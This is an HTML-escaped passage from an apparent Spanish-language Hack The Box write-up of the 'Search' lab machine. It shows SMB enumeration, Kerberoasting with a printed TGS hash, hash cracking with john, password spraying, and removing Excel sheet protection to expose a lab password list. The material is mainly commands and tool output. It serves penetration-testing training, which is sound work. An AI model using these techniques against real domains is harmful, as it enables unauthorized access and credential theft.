3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: search.htb0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;research                                                                 
| Not valid before: 2020-08-11T08:13:35                                                                  
|_Not valid after:  2030-08-09T08:13:35                                                                                                                                  
|_ssl-date: 2021-12-24T18:40:22+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +1s from scanner time.                                                           
8172/tcp  open  ssl/http      Microsoft IIS httpd 10.
|_http-server-header: Microsoft-IIS/10.0                              
|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;&apos;t have a title.                                                                                                    
| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH                                                                                                                      
| Not valid before: 2020-04-07T09:05:25                                                                                                     
|_Not valid after:  2030-04-05T09:05:25                                                                                                     
|_ssl-date: 2021-12-24T18:40:22+00:00; +1s from scanner time.                                            
| tls-alpn:                                                           
|_  http/1.1                                                                                                                                                             
9389/tcp  open  mc-nmf        .NET Message Framing                    
49667/tcp open  msrpc         Microsoft Windows RPC                   
49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                    
49670/tcp open  msrpc         Microsoft Windows RPC                                                                                         
49691/tcp open  msrpc         Microsoft Windows RPC                                                                                         
49701/tcp open  msrpc         Microsoft Windows RPC                                 
49725/tcp open  msrpc         Microsoft Windows RPC                   
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows
                                                                                                                                            
Host script results:                                                                                                                                                     
| smb2-security-mode:                                                                                                                                                    
|   2.02:                                                                                                
|_    Message signing enabled and required                                                                                                  
| smb2-time:                                                                        
|   date: 2021-12-24T18:39:43                                                                            
|_  start_date: N/A      
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Como vemos procedemos a añadir el commonName de la maquina al /etc/hosts/  –&amp;gt; search.htb research.htb&lt;/p&gt;

&lt;p&gt;Seguimos enumerando informcion, empezando por la pagina WEB&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://10.10.11.129 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;200 OK] Bootstrap, Country[RESERVED][ZZ], Email[youremail@search.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.11.129], JQuery[3.3.1], Microsoft-IIS[10.0], Script, Title[Search &amp;amp;mdash&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Just Testing IIS], X-Powered-By[ASP.NET]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a enumerar la pagina web visualmente.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Encontramos la siguiente credencial y user &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://10.10.11.129/images/slide_2.jpg&quot;&lt;/span&gt;
User: &lt;span class=&quot;s2&quot;&gt;&quot;Hope Sharp&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Pass: &lt;span class=&quot;s2&quot;&gt;&quot;IsolationIsKey?&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Verificamos con Crackmapexec la credencial obtenida para el usuario hope.sharp&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# crackmapexec smb 10.10.11.129 -u hope.sharp -p &apos;IsolationIsKey?&apos;&lt;/span&gt;
SMB         10.10.11.129    445    RESEARCH         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:RESEARCH&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:search.htb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         10.10.11.129    445    RESEARCH         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] search.htb&lt;span class=&quot;se&quot;&gt;\h&lt;/span&gt;ope.sharp:IsolationIsKey?
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a intentar conectarnos a los recursos de SMB&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;&apos; -H 10.10.11.129                                                                                                                          &lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.11.129:445        Name: search.htb                                        
                                                                                                                                                                                                                                                 
&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;hope.sharp&apos; -p &apos;IsolationIsKey?&apos; -H 10.10.11.129&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.11.129:445        Name: search.htb                                        
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        ADMIN&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                 NO ACCESS       Remote Admin
        C&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                     NO ACCESS       Default share
        CertEnroll                                              READ ONLY       Active Directory Certificate Services share
        helpdesk                                                NO ACCESS
        IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                                   READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        RedirectedFolders&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                     READ, WRITE
        SYSVOL                                                  READ ONLY       Logon server share 

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Enumeramos Usuarios del Sistema por SMB&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;hope.sharp&apos; -p &apos;IsolationIsKey?&apos; -H 10.10.11.129 -r &apos;RedirectedFolders$&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.11.129:445        Name: search.htb                                        
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        RedirectedFolders&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                     READ, WRITE
        .&lt;span class=&quot;se&quot;&gt;\R&lt;/span&gt;edirectedFolders&lt;span class=&quot;nv&quot;&gt;$\&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
        dr--r--r--                0 Mon Jun  6 11:47:52 2022    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
        dr--r--r--                0 Mon Jun  6 11:47:52 2022    ..
        dr--r--r--                0 Tue Apr  7 20:12:58 2020    abril.suarez
        dr--r--r--                0 Fri Jul 31 15:11:32 2020    Angie.Duffy
        dr--r--r--                0 Fri Jul 31 14:35:32 2020    Antony.Russo
        dr--r--r--                0 Tue Apr  7 20:32:31 2020    belen.compton
        dr--r--r--                0 Fri Jul 31 14:37:36 2020    Cameron.Melendez
        dr--r--r--                0 Tue Apr  7 20:15:09 2020    chanel.bell
        dr--r--r--                0 Fri Jul 31 15:09:07 2020    Claudia.Pugh
        dr--r--r--                0 Fri Jul 31 14:02:04 2020    Cortez.Hickman
        dr--r--r--                0 Tue Apr  7 20:20:08 2020    dax.santiago
        dr--r--r--                0 Fri Jul 31 13:55:34 2020    Eddie.Stevens
        dr--r--r--                0 Thu Apr  9 22:04:11 2020    edgar.jacobs
        dr--r--r--                0 Fri Jul 31 14:39:50 2020    Edith.Walls
        dr--r--r--                0 Tue Apr  7 20:23:13 2020    eve.galvan
        dr--r--r--                0 Tue Apr  7 20:29:22 2020    frederick.cuevas
        dr--r--r--                0 Thu Apr  9 16:34:41 2020    hope.sharp
        dr--r--r--                0 Tue Apr  7 20:07:00 2020    jayla.roberts
        dr--r--r--                0 Fri Jul 31 15:01:06 2020    Jordan.Gregory
        dr--r--r--                0 Thu Apr  9 22:11:39 2020    payton.harmon
        dr--r--r--                0 Fri Jul 31 13:44:32 2020    Reginald.Morton
        dr--r--r--                0 Tue Apr  7 20:10:25 2020    santino.benjamin
        dr--r--r--                0 Fri Jul 31 14:21:42 2020    Savanah.Velazquez
        dr--r--r--                0 Thu Nov 18 02:01:45 2021    sierra.frye
        dr--r--r--                0 Thu Apr  9 22:14:26 2020    trace.ryan
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedemos a crearnos un listado de Usuarios Potenciales.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;hope.sharp&apos; -p &apos;IsolationIsKey?&apos; -H 10.10.11.129 -r &apos;RedirectedFolders$&apos; | awk &apos;NF{print $NF}&apos; | tail -n 23 &amp;gt; &quot;users.txt&quot;&lt;/span&gt;
abril.suarez
Angie.Duffy
Antony.Russo
belen.compton
Cameron.Melendez
chanel.bell
Claudia.Pugh
Cortez.Hickman
dax.santiago
Eddie.Stevens
edgar.jacobs
Edith.Walls
eve.galvan
frederick.cuevas
hope.sharp
jayla.roberts
Jordan.Gregory
payton.harmon
Reginald.Morton
santino.benjamin
Savanah.Velazquez
sierra.frye
trace.ryan
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedo a realizar un ASPRepRoast Attack con el listado de usuarios encontrado:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;No encontramos ningun usuario ASPRepRoasteable
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a realizar un Kerberoasting Attack ya que tenemos las credenciales para el usuario Hope.Sharp&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# GetUserSPNs.py search.htb/hope.sharp:&apos;IsolationIsKey?&apos;&lt;/span&gt;
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
&lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------------------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----------&lt;/span&gt;
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 14:59:11.329031  &amp;lt;never&amp;gt; 

&lt;span class=&quot;c&quot;&gt;# GetUserSPNs.py search.htb/hope.sharp:&apos;IsolationIsKey?&apos; -request&lt;/span&gt;
Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
&lt;span class=&quot;nt&quot;&gt;---------------------------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------------------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----------&lt;/span&gt;
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 14:59:11.329031  &amp;lt;never&amp;gt;               



&lt;span class=&quot;nv&quot;&gt;$krb5tgs$23$*&lt;/span&gt;web_svc&lt;span class=&quot;nv&quot;&gt;$SEARCH&lt;/span&gt;.HTB&lt;span class=&quot;nv&quot;&gt;$search&lt;/span&gt;.htb/web_svc&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cbf7ed318a7ad8cef8eb9e0e46d358f2$bf63b6d423102abf531eb367994089d64a58d07aa240148ae60a26dd7e4c556b5a5916833b383160108453c1c1ee2cce944fa0a37024e5843d01c522a7a3169d622839224ae5132b1a83b77d2c6d0157fd046088594e020325b94c4adc9bfb3cec364a71962220599f0fede8af038bbc894748faade1ac12305969d26705a97902f3e8ea4ed9073a03c21ff05681f6da028330c3a399a006111936fdccf0fa74f8f97e4c9f8ab1fa410d9a1814ab455d9c4402a54a0ec8011b62d076858471b66413743908639c886cf4f6735605c44fc82794d87231cfab376d6aba77654634c293afa887fde00e430a2be1c381608a0d49ec454d7017f137c1308347702aa0e34f144ac7d917984e5d46dc64d06212bc292bb5e3a9f47b3bb2eed119ca8477250f70246882243dde35cbee1d206ffb0f01362aceb7dd6a96c12ebb40cd94e4d7301123556c1506218961effc6d5bd3be6cae7d312a9f9e2a702132c385cf8cb7b790a3b6d1aa81fc9cb424805dbac398d35f2ffd3dd41e1a3014bbc41933b298c18796890c164ac99ff19581a67be244242e033ee6541596c57055a84c47e05be885cca5ed5f6db6e99036a2ab307c1b07bb96f0618267831f7fe203d16766318c109893b7b516bdda7eb07c2810c7dd6ac21cd0f3e738c82a0de6244d2cc83fc69edd068fe5912cfedb7933aa64fd5b020a575dc297f5a4ca4b38d0287cd8393219ad552f0bdfc0a487a44100fa0732d5477f2e7571d965e1d2e4ecdff110a28b35b4c53010d7d737c4a11614f679f86dd06b9e161825bcdc400c146a0cf2b43816bb4fcc22f86ca98c90f13d7f807f221d5c5b7f9cc136249432ddcb50be81d2bfc7d62a085ee7cbc2ded6a2b655abf119bb1d1a16116354b4f83e35ab2842f77a44f1156749b2c96ab21b25bd6b971260350ef6446f0674ecf409bc4b0b5d9f5adc4fdc729177e9a7c5fad3ac215ffca8e32e2f6a944efd3f0c630c74f17529631599eb24e1363056f3f544b6951a8b0749065c90f60b4bcf2c431f3c0827fc7135a4c22fdc3189a56bf03851ba0c97bfa5379e18912c0bba137b360ab1b9e44a921176e3d0f2f961bb4fd1ff3bcbb0d7b4b5e82a95ea6d4bbb1896cd36f665b05a8e63c3e9b7885e11b9b2a0c84b946ad34985f4215db8c075127149baae3a4e967e7754790c701f8fabb802ae25d605446581ad6e84bb30445fb49c87ebdb392678a78dccfe9c77a0cd724d143dd2051a7f4dc21ccd1d83ce673354fc4ef171dff5f9bc8bfe4cc72c4f4ed3c538f01129b46ea227c0b378555c807fee342a2fde76aebcb8dec3535d9ae58e22310a4b7483c023047e10c46efbef021ed13c5a7034213aa2b7671569fdfaeb9632c2e8827e7f3f660d68837ed0fb069ad62575c649dd894d47e5f624d1fbd53a9653b0fed574873757319e4439f98ffb966844bc39b7a65915d18efdca4687893994680aa4&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a a intentar Crackear el TGS para sacar la password en texto claro&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# john --wordlist=/usr/share/wordlists/rockyou.txt hash_web_svc &lt;/span&gt;
Using default input encoding: UTF-8
Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;krb5tgs, Kerberos 5 TGS etype 23 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;MD4 HMAC-MD5 RC4]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Will run 8 OpenMP threads
Press &lt;span class=&quot;s1&quot;&gt;&apos;q&apos;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
&lt;span class=&quot;s2&quot;&gt;&quot; @3ONEmillionbaby (web_svc)  &quot;&lt;/span&gt;   
1g 0:00:00:03 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2022-06-06 12:03&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0.3012g/s 3461Kp/s 3461Kc/s 3461KC/s @4208891ncv..?!&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Dopey&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;?!
Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show&quot;&lt;/span&gt; option to display all of the cracked passwords reliably
Session completed.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Procedo a hacer un password Spray con el listado de usuarios y la nueva contraseña conseguida&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# crackmapexec smb 10.10.11.129 -u users -p &apos;@3ONEmillionbaby&apos; --continue-on-success          &lt;/span&gt;
SMB         10.10.11.129    445    RESEARCH         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:RESEARCH&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:search.htb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;                                                                                            
SMB         10.10.11.129    445    RESEARCH         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] search.htb&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;eb_svc:@3ONEmillionbaby                                                                                                                                                      
SMB         10.10.11.129    445    RESEARCH         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] search.htb&lt;span class=&quot;se&quot;&gt;\e&lt;/span&gt;dgar.jacobs:@3ONEmillionbaby
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedo a seguir ojeando los recursos de SMB para el nuevo usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;edgar.jacobs&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;edgar.jacobs&apos; -p &apos;@3ONEmillionbaby&apos; -H 10.10.11.129 -r &apos;RedirectedFolders$/edgar.jacobs/Desktop&apos;  &lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.11.129:445        Name: search.htb                                        
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        RedirectedFolders&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                     READ, WRITE
        .&lt;span class=&quot;se&quot;&gt;\R&lt;/span&gt;edirectedFolders&lt;span class=&quot;nv&quot;&gt;$edgar&lt;/span&gt;.jacobs&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;
        dw--w--w--                0 Mon Aug 10 12:02:16 2020    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
        dw--w--w--                0 Mon Aug 10 12:02:16 2020    ..
        dr--r--r--                0 Thu Apr  9 22:05:29 2020    &lt;span class=&quot;nv&quot;&gt;$RECYCLE&lt;/span&gt;.BIN
        fr--r--r--              282 Mon Aug 10 12:02:16 2020    desktop.ini
        fr--r--r--             1450 Thu Apr  9 22:05:03 2020    Microsoft Edge.lnk
        fr--r--r--            23130 Mon Aug 10 12:30:05 2020   &lt;span class=&quot;s2&quot;&gt;&quot; Phishing_Attempt.xlsx&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Encontramos un recurso nuevo que nos traemos a nuestra maquina atacante&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;edgar.jacobs&apos; -p &apos;@3ONEmillionbaby&apos; -H 10.10.11.129 --download &apos;RedirectedFolders$/edgar.jacobs/Desktop/Phishing_Attempt.xlsx&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Starting download: RedirectedFolders&lt;span class=&quot;nv&quot;&gt;$\&lt;/span&gt;edgar.jacobs&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;hishing_Attempt.xlsx &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;23130 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] File output to: /home/pro/Escritorio/HTB/Search/content/10.10.11.129-RedirectedFolders_edgar.jacobs_Desktop_Phishing_Attempt.xlsx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a movernos el archivo a una carpeta vacia y abrirlo, al abrirlo vemos que falta una Columna ‘C’ y procedemos a realizar un ‘unzip’ para Bypassear las Restricciones del Excell&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; Procedimiento a Seguir :
 unzip Phishing_Attempt.xlsx
 sed-i&lt;span class=&quot;s1&quot;&gt;&apos;s/&amp;lt;sheetProtection[^&amp;gt;]*&amp;gt;//&apos;&lt;/span&gt; xl/worksheets/sheet2.xml
 zip &lt;span class=&quot;nt&quot;&gt;-fr&lt;/span&gt; Phishing_Attempt.xlsx &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# ls    &lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&apos;[Content_Types].xml&apos;&lt;/span&gt;   docProps   Phishing_Attempt.xlsx   _rels   xl                                                                                                                                                   

&lt;span class=&quot;c&quot;&gt;# Procedemos a modificar el archivo sheet2.xml para quitar la &amp;lt;sheetProtection&amp;gt; y volver a zipear el archivo quitando la proteccion&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# zip -fr Phishing_Attempt.xlsx *&lt;/span&gt;
freshening: xl/worksheets/sheet2.xml &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;deflated 73%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# ls&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&apos;[Content_Types].xml&apos;&lt;/span&gt;   docProps   Phishing_Attempt.xlsx   _rels   xl

&lt;span class=&quot;c&quot;&gt;# wps Phishing_Attempt.xlsx &lt;/span&gt;

Firstname	lastname	password	                        Username
Payton	Harmon	        &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;36!cried!INDIA!year!50&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;	        Payton.Harmon
Cortez	Hickman	        ..10-time-TALK-proud-66..	        Cortez.Hickman
Bobby	Wolf	        ??47^before^WORLD^surprise^91??	    Bobby.Wolf
Margaret Robinson	    //51+mountain+DEAR+noise+83//	    Margaret.Robinson
Scarlett Parks	        ++47|building|WARSAW|gave|60++	    Scarlett.Parks
Eliezer	Jordan	        &lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;05_goes_SEVEN_offer_83!!	        Eliezer.Jordan
Hunter Kirby	        ~~27%when%VILLAGE%full%00~~	        Hunter.Kirby
Sierra Frye	            &lt;span class=&quot;nv&quot;&gt;$$49&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;wide&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;STRAIGHT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;jordan&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;28&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;18	Sierra.Frye
Annabelle Wells	        &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;95~pass~QUIET~austria~77&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;	    Annabelle.Wells
Eve	Galvan	            //61!banker!FANCY!measure!25//	    Eve.Galvan
Jeramiah Fritz	        ??40:student:MAYOR:been:66??	    Jeramiah.Fritz
Abby Gonzalez	        &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;75:major:RADIO:state:93&amp;amp;&amp;amp;	        Abby.Gonzalez
Joy	Costa	            &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;30&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;venus&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;BALL&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;office&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;42&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;	        Joy.Costa
Vincent	Sutton	        &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;24&amp;amp;moment&amp;amp;BRAZIL&amp;amp;members&amp;amp;66&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;	    Vincent.Sutton
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a probar las contraseñas encontradas para los usuarios encontrados&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# crackmapexec smb 10.10.11.129 -u sierra.frye -p &apos;$$49=wide=STRAIGHT=jordan=28$$18&apos;                                                                        &lt;/span&gt;
SMB         10.10.11.129    445    RESEARCH         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:RESEARCH&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:search.htb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
